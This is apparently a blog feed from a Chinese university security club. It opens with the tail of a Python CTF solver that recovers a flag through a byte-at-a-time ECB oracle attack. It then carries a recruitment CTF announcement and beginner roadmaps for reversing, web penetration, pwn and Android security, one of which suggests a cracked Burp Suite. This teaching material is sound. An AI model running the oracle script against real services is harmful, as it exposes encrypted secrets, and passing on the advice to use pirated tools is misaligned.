class="hljs-string">&quot;&quot;</span>         <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> range(<span class="hljs-number">41</span>):             <span class="hljs-comment">#发送填充，泄露一位flag，并获取密文  </span>           sh.recvuntil(<span class="hljs-string">&quot;Amazing function: &quot;</span>)             sh.sendline(pre.encode(<span class="hljs-string">&#x27;hex&#x27;</span>))           target = sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:<span class="hljs-number">-1</span>][<span class="hljs-number">64</span>:<span class="hljs-number">96</span>]           <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">256</span>):               <span class="hljs-comment">#遍历字符，找到与获取密文一致时的情况时，即得到一位明文  </span>             tmp = <span class="hljs-string">&#x27;0&#x27;</span>*(<span class="hljs-number">47</span>-block)+flag+chr(i)               sh.recvuntil(<span class="hljs-string">&quot;Amazing function: &quot;</span>)               sh.sendline(tmp.encode(<span class="hljs-string">&#x27;hex&#x27;</span>))               now = sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:<span class="hljs-number">-1</span>]               <span class="hljs-keyword">if</span> now[<span class="hljs-number">64</span>:<span class="hljs-number">96</span>] == target:                   flag += chr(i)                   <span class="hljs-comment">#修改填充  </span>                 pre = pre[:<span class="hljs-number">-1</span>]                   <span class="hljs-keyword">break</span>       <span class="hljs-keyword">return</span> flag[<span class="hljs-number">7</span>:<span class="hljs-number">-2</span>]</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WLLM-CTF</title>
    <link href="/2020/09/22/WLLM-CTF/"/>
    <url>/2020/09/22/WLLM-CTF/</url>
    
    <content type="html"><![CDATA[<h3 id="WLLM-CTF"><a href="#WLLM-CTF" class="headerlink" title="WLLM_CTF"></a>WLLM_CTF</h3><p>欢迎参加网络联盟招新CTF比赛，开启ctf学习之旅~本次比赛排名靠前有神秘小礼品</p><p>比赛地址：<a href="http://47.116.79.40:8000/">http://47.116.79.40:8000/</a></p><p>招新群qq群：<strong>908165572</strong> </p><p>注册格式</p><ol><li>用户名请设置为：学号_姓名缩写，如 <strong>202031063304_wyk</strong>。</li><li>邮箱请填写为<strong>QQ邮箱</strong>。</li></ol><p>非本格式用户将被移除。</p><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p>单人一队，根据题目描述，题目附件解出flag并提交，flag格式为flag{ }。</p><p>后台会有flag提交记录，禁止交流思路、交换flag等行为，发现取消比赛资格。</p><p>禁止对平台进行攻击或暴力破解！！！我们只用于学习练习！！！</p><h3 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h3><p>比赛于2020.09.22早上九点开始，历时三周，平台现已开放注册。比赛结束或招新我们会在招新群里通知，届时请在24小时内提交wp（你们的解题思路），到时候会在群里详细通知。</p><p>我们会根据比赛排名，面试等选拔同学加入网络联盟团队。</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>比赛针对西南石油大学全校对网络安全感兴趣的学生，题目比较有趣，也会给提示，不要害怕做不出哈~</p><p>比赛用于网络联盟团队招新，本意是边做边学，大佬请绕过。有任何问题（包括招新、学习上的）都可以在招新群qq群进行咨询。</p><p>团队位于明理楼C1013，有时间可以来参观~</p><blockquote><p>本次比赛最终解释权归网络联盟团队所有</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向入门</title>
    <link href="/2020/09/22/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8/"/>
    <url>/2020/09/22/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>0x00前言</strong></p><p>什么是逆向工程？逆向工程主要针对软件方面,学习计算机的底层知识,通过反汇编、反编译和动态跟踪等方法,分析出应用程序的实现过程,比如给你一个.exe的可执行文件,你想知道这个文件是否是一个病毒文件,就要进行对这个文件进行逆向,分析出他的行为来判断是否是一个病毒文件.应用的主要方向：软件破解、病毒分析、游戏漏洞分析、移动安全、二进制漏洞挖掘与利用.</p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>对于逆向工程来说最为基础的就是掌握一门语言,语言是我们与计算机交流的一种工具,在学习逆向工程的过程中,你要练就扎实的的语言基础,不然当你拿到一个软件时,你会无从下手,简单的说,我们大概需要掌握如下语言：</p><ol><li>汇编语言：这是能否读懂底层代码的关键,我们分析他人的软件时一般是无源码无符号调试（除非是你自己写的,或者是开源的）,这是经常的事,几乎商业软件都不会将自己的软件代码开源出来,那样意味着别人可以随意对自己的东西进行修改删除或者进行盗版发行,这是对软件商来说是不利的,但我们逆向分析人员厉害的就是可以通过一些工具进行无源码分析,功能修改,常见的就是外挂,但前提是你要懂汇编语言,这是我们考核的重点内容.这里大家可以通过王爽老师的《汇编语言》一书配合<a href="https://www.bilibili.com/video/av28132657?from=search&seid=3279023914865469916">小甲鱼的汇编视频</a>.</li><li>c/c++: 这两门语言将是逆向分析者最常遇见和使用的语言,具体则体现在对于一些补丁的编写,当然不排除可以使用一些其他的语言,但请注意,我们来开篇便言明,逆向工程是学习离不开计算机底层知识,所以c/c++无疑是必须的.我们推荐可以学习<a href="https://www.bilibili.com/video/av27744141?from=search&seid=3279023914865469916">小甲鱼的视频</a>或者其他书籍</li><li>脚本语言和界面编程<br>在此基础上在扩展学习Python编写脚本,c#或者任意一门界面开发.</li></ol><h3 id="延伸"><a href="#延伸" class="headerlink" title="延伸"></a>延伸</h3><p>那么怎样开始逆向的学习,可以参考以下内容：</p><ol><li>工具的学习：OllyDbg一款经典的反汇编调试器,是最基础的工具,只有熟练掌握了这个工具,我们才能真正展开逆向分析学习,而在此之上的一些延伸工具,如PEiD、ida等都会在后续学习在慢慢了解,以下我们为你们提供了一个学习OD的视频,<a href="https://pan.baidu.com/s/14_oDRDWRaptinzpawHXDVg">链接</a>提取码：pqha .</li><li>逆向研究方向：Windows、安卓、二进制等,他们又会有所区别？你们暂时不需要知道,在你学习掌握一些基础知识后我们后续会进行说明和解释,记住方向的选择是在你有一定的基础之后.</li></ol><h2 id="寄语"><a href="#寄语" class="headerlink" title="寄语"></a>寄语</h2><ul><li>逆向的学习绝非易事,涉及很多枯燥的技术,例如汇编、操作系统底层知识、外壳对抗等,这很容易让你放弃,中途而废.下面我们提供一些学习建议</li></ul><h4 id="1-打好基础是前提"><a href="#1-打好基础是前提" class="headerlink" title="1.打好基础是前提"></a>1.打好基础是前提</h4><ul><li>不会走就想跑,是初学者最容易犯的错误.如C语言、API还没学明白,就想去玩内核驱动,不懂汇编没调试过程序就去玩Hook.</li></ul><h4 id="2-多调试-多实践"><a href="#2-多调试-多实践" class="headerlink" title="2.多调试,多实践"></a>2.多调试,多实践</h4><ul><li>调试是逆向工作者的必备技能,不要空想,也不要未实践就乱下结论,一定要多动手.</li></ul><h4 id="3-定好学习目标"><a href="#3-定好学习目标" class="headerlink" title="3.定好学习目标"></a>3.定好学习目标</h4><ul><li>首先确定自己要学什么,然后再向着目标前进.有的人今天学汇编,明天学C,后天不知道是学JAVA还是.NET,亦或者是Python.有的人,看到别人用驱动写了个进程保护挺NB,C语言还没学会,就投奔驱动去了,或者刚学内核什么都没研究明白,看别人又是解析HIVE又是解析,马上又转方向了.</li></ul><h4 id="4-充分利用好各种学习资源"><a href="#4-充分利用好各种学习资源" class="headerlink" title="4.充分利用好各种学习资源"></a>4.充分利用好各种学习资源</h4><ul><li>网上有很多学习资源,例如优秀的代码和学习教程,以及很多大佬的帖子,都能学到不少干货.</li></ul><p><a href="https://www.52pojie.cn/">吾爱破解</a></p><p><a href="https://bbs.pediy.com/">看雪论坛</a></p><h4 id="5-善用搜索引擎"><a href="#5-善用搜索引擎" class="headerlink" title="5.善用搜索引擎"></a>5.善用搜索引擎</h4><ul><li>对初学者而言,遇到的大部分问题都可以找到前人们的资料和答案.除非某个问题我思考了很久确实无法解决,搜索到的相关资料也无法提供帮助,这时候才适合去寻求他人的帮助,寻求学长帮助.</li></ul><h4 id="6-最后就是要吃苦-要坚持"><a href="#6-最后就是要吃苦-要坚持" class="headerlink" title="6.最后就是要吃苦,要坚持"></a>6.最后就是要吃苦,要坚持</h4><ul><li>学习逆向的过程并不轻松,尤其是汇编、破解,尽可能地坚持不要放弃.真正地提升就是在你坚持坚持再坚持之后,之前的一切都只是铺垫,放弃了就什么都没有了~</li></ul>]]></content>
    
    
    <categories>
      
      <category>re</category>
      
    </categories>
    
    
    <tags>
      
      <tag>入门</tag>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透入门</title>
    <link href="/2020/09/22/%E6%B8%97%E9%80%8F%E5%85%A5%E9%97%A8/"/>
    <url>/2020/09/22/%E6%B8%97%E9%80%8F%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="web安全简单说"><a href="#web安全简单说" class="headerlink" title="web安全简单说"></a>web安全简单说</h3><p>网络安全的学习有很多方向：渗透测试，逆向工程，密码学，移动安全，硬件安全等。就web渗透来说的话，入门相对简单，因为我们都接触和实际使用过网站，但是web渗透越深入越复杂，越往后学习，涉及到的知识体系越大。所以学习web渗透，重点是<strong>将相关的基础知识打牢</strong>，基础知识牢固，后面继续深入学习的时候才会顺其自然。</p><h3 id="知识简介"><a href="#知识简介" class="headerlink" title="知识简介"></a>知识简介</h3><p>说到web渗透的基础知识，web渗透的基础知识很多，这也就是为什么深入学习的时候它的知识体系是非常庞大的。web前后端，web服务器，HTML，js，php，java，python等语言，liunx相关知识，协议，端口；同时还有很多的专业术语：exp，poc，payload，shell等。</p><h3 id="入门指南"><a href="#入门指南" class="headerlink" title="入门指南"></a>入门指南</h3><p>上面简单介绍了一下web渗透相关的东西，下面主要详细说一下关于web渗透入门学习的一个推荐学习历程（可根据自己的实际情况学习，这里只是针对不知道该如何学习的同学的一个引导）：</p><h4 id="前端语言"><a href="#前端语言" class="headerlink" title="前端语言"></a>前端语言</h4><p>写出来的web页面总要有点样式吧，所以前端还是要简单学习一下的，才开始入门的话不用太深入，简单的学习即可：</p><ul><li>HTML</li><li>javascript</li><li>ajax</li><li>css</li></ul><p>推荐学习地址：<br><a href="https://www.runoob.com/html/html-tutorial.html">HTML</a><br><a href="https://www.runoob.com/js/js-tutorial.html">javascript</a><br><a href="https://www.runoob.com/ajax/ajax-tutorial.html">ajax</a><br><a href="https://www.runoob.com/css/css-tutorial.html">css</a></p><h4 id="后端语言PHP"><a href="#后端语言PHP" class="headerlink" title="后端语言PHP"></a>后端语言PHP</h4><p>php语言主要就是方便简单，但同时PHP出现的漏洞也是非常多的，在我们初学web时，使用php可以帮助我们很快的入门，初学时要会写简单的代码，实现get，post请求，知道cookie，header，实现前后端交互，对数据库的操作这些简单的操作。<br><a href="https://www.runoob.com/php/php-tutorial.html">PHP教程</a></p><p>我们要使用一个web服务器来运行php写的简单的站点或者页面，这里我们使用PHPstudy，PHPstudy集成了Apache+PHP+mysql，没有复杂的服务器配置，使用非常简单。<br><a href="http://phpstudy.php.cn/download.html">PHPstudy下载</a></p><p>使用PHP之前推荐先了解学习MySQL</p><h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><p>MySQL是一个使用非常广泛关系型数据库，入门学习的时候会<strong>增删查改</strong>操作即可，推荐使用PHPstudy集成的MySQL进行练习。<br><a href="https://www.runoob.com/mysql/mysql-tutorial.html">MySQL学习</a></p><h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><p>简单了解http是如何发送请求的，数据报是如何构成的。<br><a href="https://www.runoob.com/http/http-tutorial.html">HTTP协议</a></p><h4 id="Linux学习"><a href="#Linux学习" class="headerlink" title="Linux学习"></a>Linux学习</h4><p>linux系统是不同于windows系统的，在成为一个hacker的道路中不会linux是不可能的，不过入门的话不需要学太仔细，会使用基本的命令操作linux，会在linux上搭建一个web服务器。<br><a href="https://www.runoob.com/linux/Linux-intro.html">Liunx学习</a></p><p>这里可能会有点难入门，linux服务器可以使用VMware workstation 或者 腾讯云/阿里云购买一台ubuntu服务器，这个可以先暂时放在一边，也可以问学长，只要是学习，学长们都是来者不拒的。</p><h3 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><p>学习了上面的基础知识后，就可以开始学习一些漏洞原理了，学习原理是通过PHP复现，一是PHP简单易上手，二是PHP几乎涵盖所有常见类型漏洞，理解起来也比较简单</p><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>MySQL学习过，我想SQL语句也已经有了一定的学习，通过学习知道什么是SQL注入：<a href="https://blog.csdn.net/ideality_hunter/article/details/80623526">sql注入，一个例子让你知道什么是sql注入</a>(如果看不懂多百度)</p><p>然后在本地搭建一个专门练习SQL注入的平台，下载源码<br><a href="https://github.com/Audi-1/sqli-labs">下载 sqli-labs 源码</a><br>放到PHPstudy里面去运行，就可以训练SQL注入了。<br><a href="https://www.cnblogs.com/peterpan0707007/p/7501575.html">sqli-labs搭建</a></p><h4 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h4><p>学习过PHP，应该对include()，include_once()，require()，require_once() 有所了解，具体请看：<br><a href="https://www.jianshu.com/p/3514f0fd79f7">文件包含漏洞学习总结</a></p><h4 id="命令执行，代码执行"><a href="#命令执行，代码执行" class="headerlink" title="命令执行，代码执行"></a>命令执行，代码执行</h4><p><a href="https://www.0dayhack.com/post-834.html">Web渗透测试中命令执行漏洞详解</a><br>实际可以在dvwa平台上操作。</p><h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><p>文件上传漏洞主要是上传webshell，获取网站权限。<br><a href="https://www.jianshu.com/p/5ebba0482980">文件上传漏洞</a><br>同sqli-labs一样，文件上传也有一个靶场：<br><a href="https://github.com/c0ny1/upload-labs">upload-labs</a><br>先自己黑盒测试，如果绕不过，就白盒看看能否上传成功，实在不行就看writeup<br><a href="https://xz.aliyun.com/t/2435">upload-labs通关手册</a></p><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>学XSS要学会javascript，xss又分为反射型、存储型、DOM型xss，是由于对用户的输入过滤不严造成的，将这些恶意代码嵌入到网页中，当用户浏览的时候，其中的恶意代码就会执行。<br><a href="https://www.cnblogs.com/Hydraxx/p/8530906.html">XSS漏洞详解</a></p><p>发现一个xss小游戏，还挺有意思的：<br><a href="https://xss.haozi.me/#/">xss小游戏</a></p><h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p>CSRF现在的危害越来越小，而且防范也非常容易，但是必要的漏洞原理还是要学习。<br><a href="https://www.freebuf.com/column/155800.html">Web安全-CSRF漏洞</a></p><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>SSRF是通过服务器端去发送请求，可以执行访问内网，探测端口等敏感操作。<br><a href="https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">SSRF漏洞的利用与学习</a></p><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>学习XXE漏洞之前需要学一下XML。<br><a href="https://www.runoob.com/xml/xml-tutorial.html">XML教程</a><br>[一篇文章带你理解漏洞之 XXE 漏洞](<a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3">https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解</a> XXE 漏洞/)</p><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>先学习PHP的反序列化，等后面学了java后，再学习java的反序列化漏洞。<br><a href="https://blog.csdn.net/nzjdsds/article/details/82703639">四个实例递进php反序列化漏洞理解</a><br><a href="https://www.freebuf.com/articles/web/167721.html">最通俗易懂的PHP反序列化原理分析</a></p><h4 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h4><p><a href="https://www.freebuf.com/vuls/83999.html">服务端模板注入攻击 （SSTI）之浅析</a></p><h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h4><p><a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞</a></p><h4 id="论PHP的常见漏洞"><a href="#论PHP的常见漏洞" class="headerlink" title="论PHP的常见漏洞"></a>论PHP的常见漏洞</h4><p>如果前面的都了解了或者说学的不错了，那这篇文章就当一个比较全面的总结吧。<br><a href="http://www.vuln.cn/7075">http://www.vuln.cn/7075</a></p><h4 id="大量的CTF练习"><a href="#大量的CTF练习" class="headerlink" title="大量的CTF练习"></a>大量的CTF练习</h4><p>在前期阶段，做大量的CTF题目有助于我们快速的成长，因为CTF里面涉及到了很多的知识点，做大量的题目，搞清楚每个题目所涉及到的知识点，最后无疑会产生非常大的一个质变。除了我下面推荐的两个平台，i春秋，合天智汇等也有优质的CTF赛题，还有很多是往届赛事的题目。当大家融入到这个圈子之后，找这些也很容易。</p><h3 id="推荐靶场"><a href="#推荐靶场" class="headerlink" title="推荐靶场"></a>推荐靶场</h3><h4 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h4><p>DVWA涵盖了php的常见漏洞，提供了一个测试环境，上述提到的漏洞基本都可以在这上面进行复现。<br>源码下载：<a href="https://github.com/ethicalhack3r/DVWA">dvwa源码下载</a><br>同sqli-labs一样，将DVWA放在PHPstudy的www目录下，配置好数据库即可运行。</p><h4 id="Bugku"><a href="#Bugku" class="headerlink" title="Bugku"></a>Bugku</h4><p><a href="https://ctf.bugku.com/">Bugku</a>是一个ctf练习平台，在初学阶段，ctf可以衡量大家是否掌握这些基础知识。</p><h4 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h4><p><a href="https://adworld.xctf.org.cn/">攻防世界</a>也是一个ctf平台。</p><p>大家在做ctf的时候，肯定会有些题不会做，先试着自己做，当实在不会的时候再在网上搜索writeup，跟着writeup边做边思考为什么，然后再自己思考是否还有其他做法。</p><h3 id="工具学习"><a href="#工具学习" class="headerlink" title="工具学习"></a>工具学习</h3><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。<br>学习链接：<br><a href="http://www.vuln.cn/1992">Sqlmap使用教程</a><br><a href="https://www.freebuf.com/sectool/164608.html">超详细SQLMap使用攻略及技巧分享</a></p><p>因为sqlmap需要python环境的的，所以要先搭建好python环境：<br><a href="https://www.runoob.com/python/python-install.html">python 环境搭建</a></p><h4 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h4><p>burp是一个可以抓取请求数据包/拦截响应数据包的工具，在渗透测试中，burp是必备工具，必须要熟练运用burpsuite。<br>因为burp专业版收费，可以在网上找破解版，burpsuite安装与使用：<br><a href="https://blog.csdn.net/liweibin812/article/details/83650751">burp suite的安装与基本使用</a></p><p>安装burp需要jdk，所以要先安装配置好jdk：<br><a href="https://blog.csdn.net/qq_42003566/article/details/82629570">jdk的下载与安装详细图解</a></p><h3 id="其余优质学习资料"><a href="#其余优质学习资料" class="headerlink" title="其余优质学习资料"></a>其余优质学习资料</h3><ul><li><a href="https://wizardforcel.gitbooks.io/mst-sec-lecture-notes/">米斯特白帽培训讲义</a></li><li><a href="https://github.com/CHYbeta/Web-Security-Learning">Web-Security-Learning</a></li><li><a href="https://xz.aliyun.com/t/2231">零基础web安全学习终极攻略</a></li><li><a href="https://websec.readthedocs.io/zh/latest/index.html#">Web安全学习笔记</a></li><li><a href="http://blog.knownsec.com/Knownsec_RD_Checklist/">技能研发表</a></li></ul><h3 id="推荐web安全微信公众号"><a href="#推荐web安全微信公众号" class="headerlink" title="推荐web安全微信公众号"></a>推荐web安全微信公众号</h3><ul><li>HACK学习呀</li><li>合天智汇</li><li>Ms08067安全实验室</li><li>安全祖师爷</li><li>洛米唯熊</li><li>小白帽学习之路</li></ul><h3 id="推荐知识星球"><a href="#推荐知识星球" class="headerlink" title="推荐知识星球"></a>推荐知识星球</h3><ul><li>Bypass<br>(其他的不收费的我也不太了解)</li></ul><h3 id="推荐学习平台"><a href="#推荐学习平台" class="headerlink" title="推荐学习平台"></a>推荐学习平台</h3><ul><li><a href="https://www.ichunqiu.com/">i春秋</a></li><li><a href="http://www.hetianlab.com/">合天智汇实验室</a></li><li><a href="https://xz.aliyun.com/">先知社区</a></li><li><a href="https://www.anquanke.com/">安全客</a></li><li><a href="https://www.freebuf.com/">freebuf</a></li></ul><h3 id="PDF分享"><a href="#PDF分享" class="headerlink" title="PDF分享"></a>PDF分享</h3><ul><li><a href="https://pan.baidu.com/s/1KLX5rXkN-qQTSFrclyDWNQ">白帽子讲Web安全</a></li><li><a href="https://pan.baidu.com/s/1tZF2Jdrn36x1A1PuYStD1A">黑客攻防技术宝典-Web实战篇(第2版)</a></li><li><a href="https://pan.baidu.com/s/1rQfpIvyUbZb3qKEnf2ix2w">Web前端黑客技术揭秘</a></li><li><a href="https://pan.baidu.com/s/1imIXl1rVpLv1iFEnY7zOfg">鸟哥的私房菜-linux基础篇</a></li><li><a href="https://pan.baidu.com/s/11DsUl0IMsEiljZ4mx8KitQ">图解HTTP</a></li></ul><h3 id="说在最后"><a href="#说在最后" class="headerlink" title="说在最后"></a>说在最后</h3><p>学习最重要的是静下心来，这点我深有体会，后期在学一个东西或者知识点的时候，一定要记得专研，不要只停留在一个浅在的表面，只有专研才能有进步，在学习一个东西的时候切记不要分心，不要受外界影响，不能看到其他人在打游戏，出去玩，你也就想着一起玩会儿游戏，人是很容易堕落的，希望大家在学习的道路上能一往无前。</p><p>上面的一些学习链接如果并不能让大家理解这个东西，可以继续百度，也可以咨询学长们。在学习过程中遇到的任何问题都可以咨询群里的学长，也欢迎大家多多问问题，同时有什么意见或者提议也可以联系我们。</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>入门</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二进制安全入门</title>
    <link href="/2020/09/22/pwn%E5%85%A5%E9%97%A8/"/>
    <url>/2020/09/22/pwn%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<blockquote><ol><li><p>pwn：”Pwn”是一个黑客语法的俚语词 ，是指攻破设备或者系统 。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵。</p><p>CTF中PWN题型通常会直接给定一个已经编译好的二进制程序（Windows下的EXE或者Linux下的ELF文件等），然后参赛选手通过对二进制程序进行逆向分析和调试来找到利用漏洞，并编写利用代码，通过远程代码执行来达到溢出攻击的效果，最终拿到目标机器的shell夺取flag。</p></li><li><p>二进制逆向可以概括为 从目标代码反推到源代码，再通过源代码去理解该文件的实现的功能和创作的意义，这项技术在实战中常应用的领域为 软件破解、漏洞挖掘、恶意木马的分析。</p></li></ol></blockquote><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h1><p>掌握C语言，推荐小甲鱼的教学视频 </p><p>掌握汇编语言，推荐书籍《汇编语言（第三版）》——王爽 </p><p>学习linux系统，推荐书籍《鸟哥的linux私房菜》 </p><p>学习python基本语法，推荐廖雪峰的网站 \ 《python核心编程》</p><h1 id="0x02-工具准备"><a href="#0x02-工具准备" class="headerlink" title="0x02 工具准备"></a>0x02 工具准备</h1><ul><li>VMWare虚拟机中安装ubuntu16&amp;&amp;18</li><li>IDA Pro</li><li>OllyDbg </li></ul><p>对于这些工具都要会简单的调试</p><h2 id="ubuntu中的工具安装"><a href="#ubuntu中的工具安装" class="headerlink" title="ubuntu中的工具安装"></a>ubuntu中的工具安装</h2><ul><li><p>pwntools（<a href="https://pwntools.readthedocs.io/en/stable/">pwntools的官方文档</a>） </p></li><li><p>gdb（以下三种选一即可） 学会使用gdb</p></li><li><ul><li>peda </li></ul></li><li><ul><li>pwndbg </li></ul></li><li><ul><li>gef </li></ul></li><li><p>python </p></li><li><p>ROPgadget </p></li><li><p>one_gadget </p><p>剩下的一些工具在学习中用到时再慢慢安装，如roputils 、 LibcSearcher</p></li></ul><h1 id="0x03-学习资料"><a href="#0x03-学习资料" class="headerlink" title="0x03 学习资料"></a>0x03 学习资料</h1><h2 id="集合："><a href="#集合：" class="headerlink" title="集合："></a>集合：</h2><ol><li><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/">CTF-wiki</a> 入门可以先跟着Wiki走，从栈溢出开始学习，跟着复现</p></li><li><p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/">CTF-All-In-One</a> 也是一个不错的资料</p></li><li><p><a href="https://sploitfun.wordpress.com/2015/06/26/linux-x86-exploit-development-tutorial-series/">SploitFun Linux x86 Exploit 开发系列教程</a></p></li><li><p><a href="https://chybeta.github.io/2017/08/19/Software-Security-Learning/">Software-Security-Learning</a></p></li></ol><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>一步一步ROP系列 </p><ul><li>之x86</li><li>之x64</li><li>之gadgets和2free</li></ul><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p><a href="https://github.com/shellphish/how2heap">how2heap</a></p><p><a href="%5Bhttps://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf%5D(https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf)">Glibc 内存管理 Ptmalloc2 源代码分析</a></p><h2 id="书"><a href="#书" class="headerlink" title="书"></a>书</h2><p>《程序员的自我修养》</p><p>《深入理解计算机系统》</p><p>《有趣的二进制》</p><p>《0day漏洞挖掘与利用》</p><h1 id="0x04-其他"><a href="#0x04-其他" class="headerlink" title="0x04 其他"></a>0x04 其他</h1><p>可以到 jarvis oj \ buuctf \ pwnable.tw \ pwnable.kr 等平台进行练习ctf-pwn</p><p>常去一些安全平台，如 看雪、FreeBuf、安全客、先知、吾爱破解等学习新知识新思想</p><p>逆向和二进制不分家，入门二进制，基础很重要</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>入门</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android安全入门</title>
    <link href="/2020/09/22/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8/"/>
    <url>/2020/09/22/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="0x1背景介绍"><a href="#0x1背景介绍" class="headerlink" title="0x1背景介绍"></a>0x1背景介绍</h1><p>移动安全主要针对常见的移动应用，根据市面上主流的操作系统，分为<strong>Android安全</strong>和<strong>IOS安全</strong>，团队目前的主要学习方向为<strong>Android安全</strong>，通过学习<strong>Android安全</strong>，达到对Android APP运行原理的剖析，进而实现一些APP的破解和防护。</p><h1 id="0x2学习内容"><a href="#0x2学习内容" class="headerlink" title="0x2学习内容"></a>0x2学习内容</h1><p>主要学习的基础内容包括<strong>c语言及java基础语法</strong>，<strong>arm汇编语言</strong>，<strong>smali语法</strong>，<strong>相关逆向分析工具的使用</strong></p><h1 id="0x3学习资料"><a href="#0x3学习资料" class="headerlink" title="0x3学习资料"></a>0x3学习资料</h1><p>这里给出一些基础的学习资料</p><p>C语言：<a href="https://www.bilibili.com/video/BV17s411N78s">https://www.bilibili.com/video/BV17s411N78s</a></p><p>Android软件安全与逆向分析(书)：<a href="https://pan.baidu.com/share/link?shareid=786047723&amp;uk=4094128358">https://pan.baidu.com/share/link?shareid=786047723&amp;uk=4094128358</a></p>]]></content>
    
    
    <categories>
      
      <category>安卓</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安卓</tag>
      
      <tag>入门</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
